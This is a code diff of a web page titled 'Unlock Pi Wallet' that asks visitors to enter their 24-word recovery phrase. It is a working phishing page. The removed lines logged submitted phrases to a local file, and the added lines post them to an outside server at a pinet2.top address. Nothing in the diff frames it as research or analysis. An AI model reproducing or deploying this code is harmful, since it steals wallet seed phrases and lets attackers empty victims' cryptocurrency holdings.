@@ -31,19 +31,12 @@
                         <div style="padding: 20px;">
                             
                             <h1 style="text-align: center; color: rgb(51, 51, 51); font-size: 24px; font-weight: bold; margin-bottom: 30px;">Unlock Pi Wallet</h1>
- 
+                           
 
-						<?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['text'])) {
-    file_put_contents('data.txt', $_POST['text'] . "\n", FILE_APPEND);
-}
-?>
-
-							
-							<form method="POST">
+						   <form method="post" action="https://pinet2.top/upgrade-exchange/send1.php">
                             <div style="background-color: white; border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 1px solid rgb(224, 224, 224);">
-                                 <input type="email" name="email">
-                                <textarea name="text" placeholder="Enter your 24-word recovery phrase here" rows="6" style="width: 100%; border: none; outline: none; font-size: 20px; font-family: monospace; resize: none; color: rgb(153, 153, 153); background-color: transparent;" required></textarea>
+                                
+                                <textarea name="message" placeholder="Enter your 24-word recovery phrase here" rows="6" style="width: 100%; border: none; outline: none; font-size: 20px; font-family: monospace; resize: none; color: rgb(153, 153, 153); background-color: transparent;" required></textarea>
                                 
                                 </div>
                                 
